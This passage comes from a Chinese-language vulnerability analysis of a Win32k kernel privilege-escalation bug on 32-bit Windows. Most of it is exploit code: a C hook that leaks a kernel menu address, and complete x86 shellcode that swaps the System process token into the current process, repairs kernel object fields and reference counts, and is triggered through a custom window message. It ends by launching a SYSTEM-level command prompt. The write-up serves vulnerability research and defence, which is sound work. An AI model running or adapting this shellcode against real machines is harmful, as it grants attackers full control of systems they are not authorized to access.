        LONG          idObject,
        LONG          idChild,
        DWORD         idEventThread,
        DWORD         dwmsEventTime
    )
    {
        if (iMenuCreated == 0)
        {
            popupMenuRoot = *(DWORD *)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
        }
        if (++iMenuCreated >= 2)
        {
            SendMessageW(hwnd, MN_ENDMENU, 0, 0);
        }
        else
        {
            SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
        }
    }
_在函数 xxWindowEventProc 中增加获取根弹出菜单对象地址的利用代码_
在利用代码开始的位置初始化结构体 `SHELLCODE` 对象缓冲区时，拷贝利用函数 `xxPayloadWindProc` 的代码到
`SHELLCODE` 对象缓冲区中。接下来实现对 `xxPayloadWindProc`
函数代码的构造。该函数的代码将作为载体窗口对象的内核模式消息处理函数在内核上下文中执行。与在用户上下文中执行的窗口对象消息处理函数稍有不同的是，内核模式窗口对象消息处理函数的第
1 个参数是指向目标窗口 `tagWND` 对象的指针，其余参数都相同。
为了精确识别触发提权的操作，在代码中定义 `0x9F9F` 为触发提权的消息。在 ShellCode
函数代码中，我们首先判断传入的消息参数是否是我们自定义的提权消息：
    push    ebp
    mov     ebp,esp
    mov     eax,dword ptr [ebp+0Ch]
    cmp     eax,9F9Fh
    jne     LocFAILED
在 32 位的 Windows 操作系统中，用户上下文代码段寄存器 `CS` 值为 `0x1B`，借助这个特性，在 ShellCode
函数代码中判断当前执行上下文是否在用户模式下，如是则返回失败。
    mov     ax,cs
    cmp     ax,1Bh
    je      LocFAILED
恢复载体窗口对象的成员标志位为初始值。与之前修改标志位时的自减相对地，使成员标志位 `bDialogWindow` 地址起始的 32
位数据直接自增，这样一来，成员标志位 `bServerSideWindowProc` 等被修改的标志位将恢复到修改之前的状态。
    cld
    mov     ecx,dword ptr [ebp+8]
    inc     dword ptr [ecx+16h]
首先备份当前所有通用寄存器的数值在栈上，接下来通过 `CALL-POP` 技术获取当前 `EIP` 执行指令的地址，并根据相对偏移计算出存储在
ShellCode 函数代码前面位置的结构体 `SHELLCODE` 对象的首地址：
    pushad
    call    $+5
    pop     edx
    sub     edx,443h
遍历结构体 `SHELLCODE` 对象存储的 `tagCLS` 数组并与通过参数 `wParam` 传入的根弹出菜单对象的内核地址进行匹配，并将匹配到的
`tagCLS` 对象的成员域 `lpszMenuName` 置空。
    mov     ebx,100h
    lea     esi,[edx+18h]
    mov     edi,dword ptr [ebp+10h]
    LocForCLS:
    test    ebx,ebx
    je      LocGetEPROCESS
    lods    dword ptr [esi]
    dec     ebx
    cmp     eax,0
    je      LocForCLS
    add     eax,dword ptr [edx+8]
    cmp     dword ptr [eax],edi
    jne     LocForCLS
    and     dword ptr [eax],0
    jmp     LocForCLS
接下来获取载体窗口对象头部结构中存储的线程信息 `tagTHREADINFO` 对象指针，并继续获取线程信息对象中存储的进程信息
`tagPROCESSINFO` 对象指针，并获取对应进程的进程体 `EPROCESS` 对象指针。各个成员域的偏移在结构体 `SHELLCODE`
对象中存储。
    LocGetEPROCESS:
    mov     ecx,dword ptr [ecx+8]
    mov     ebx,dword ptr [edx+0Ch]
    mov     ecx,dword ptr [ebx+ecx]
    mov     ecx,dword ptr [ecx]
    mov     ebx,dword ptr [edx+10h]
    mov     eax,dword ptr [edx+4]
接下来根据进程体 `EPROCESS` 对象的成员域 `ActiveProcessLinks` 双向链表和成员域 `UniqueProcessId`
进程标识符找到当前进程的 `EPROCESS` 地址。由于 `UniqueProcessId` 是成员域 `ActiveProcessLinks`
的前一个成员域，因此直接使用 `SHELLCODE` 对象中存储的 `ActiveProcessLinks` 偏移值来定位
`UniqueProcessId` 的位置。
    push    ecx
    LocForCurrentPROCESS:
    cmp     dword ptr [ebx+ecx-4],eax
    je      LocFoundCURRENT
    mov     ecx,dword ptr [ebx+ecx]
    sub     ecx,ebx
    jmp     LocForCurrentPROCESS
    LocFoundCURRENT:
    mov     edi,ecx
    pop     ecx
紧接着继续遍历进程体 `EPROCESS` 对象链表，以找到 System 进程的进程体对象地址。
    LocForSystemPROCESS:
    cmp     dword ptr [ebx+ecx-4],4
    je      LocFoundSYSTEM
    mov     ecx,dword ptr [ebx+ecx]
    sub     ecx,ebx
    jmp     LocForSystemPROCESS
    LocFoundSYSTEM:
    mov     esi,ecx
执行到这一步已定位到当前进程和 System 进程的进程体对象地址，接下来就使用 System 进程的成员域 `Token` 指针替换当前进程的
`Token` 指针。
    mov     eax,dword ptr [edx+14h]
    add     esi,eax
    add     edi,eax
    lods    dword ptr [esi]
    stos    dword ptr es:[edi]
此时当前进程已拥有 System 进程的 `Token` 指针，额外增加的引用需要手动为目标 `Token` 对象增加对象引用计数。在 NT
执行体模块中大多数内核对象都是以 `OBJECT_HEADER` 结构体作为头部结构：
    kd> dt nt!_OBJECT_HEADER
       +0x000 PointerCount     : Int4B
       +0x004 HandleCount      : Int4B
       [...]
       +0x014 SecurityDescriptor : Ptr32 Void
       +0x018 Body             : _QUAD
该结构位于内核对象地址前面的位置，内核对象起始于 `OBJECT_HEADER` 结构体的 `Body` 成员域。手动增加指针引用需要对成员域
`PointerCount` 进行自增。
    and     eax,0FFFFFFF8h
    add     dword ptr [eax-18h],2
接下来大功告成，恢复前面备份的通用寄存器的数值到寄存器中，并赋值返回值为 `0x9F9F` 作为向调用者的反馈信息。
    popad
    mov     eax,9F9Fh
    jmp     LocRETURN
    LocFAILED:
    mov     eax,1
    LocRETURN:
    leave
    ret     10h
至此 ShellCode 函数代码已编写完成。
* * *
**触发提权**
万事俱备，只欠东风。接下来在利用代码的自定义阴影窗口消息处理函数 `xxShadowWindowProc` 中调用系统服务
`NtUserMNDragLeave` 之后的位置增加对载体窗口对象发送自定义提权消息 `0x9F9F` 的调用语句，并将返回值的判断结果存储在全局变量
`bDoneExploit` 中。
    LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
    bDoneExploit = Triggered == 0x9F9F;
_在函数 xxShadowWindowProc 中增加发送提权消息的利用代码_
这样一来，在执行系统服务 `NtUserMNDragLeave` 以置位载体窗口对象的成员标志位 `bServerSideWindowProc`
之后，函数发送 `0x9F9F` 消息并将根弹出菜单对象的内核地址作为 `wParam`
参数传入，执行流将在内核上下文中直接调用载体窗口对象的自定义消息处理函数，执行到由用户进程定义的 ShellCode
代码中，实现内核提权和相关内核用户对象成员域的修复。
通过主线程监听全局变量 `bDoneExploit` 是否被赋值；如成功赋值则创建新的命令提示符进程。
_启动的命令提示符进程已属于 System 用户身份_
可以观测到新启动的命令提示符已属于 System 用户身份。
* * *
**后记**
在本分析中构造验证代码和利用代码时，处理逻辑与原攻击样本的代码稍有差异。例如，攻击样本为了保证成功率，在代码中增加了暂时挂起全部线程的操作，还将菜单和子菜单的个数设定为
3 个，还有重试机制等。在本分析中为了实现最简验证和利用代码，对这些不必要的因素进行了省略。
#### 0x5 链接
本分析的英文版本：
本分析的 POC 下载
Kernel Attacks through User-Mode Callbacks
从 Dump 到 POC 系列一: Win32k 内核提权漏洞分析
TrackPopupMenuEx function (Windows)
sam-b/windows_kernel_address_leaks
Sednit adds two zero-day exploits using 'Trump's attack on Syria' as a decoy
EPS Processing Zero-Days Exploited by Multiple Threat Actors
* * *
_本文经安全客授权发布，转载请联系安全客平台。_
* * *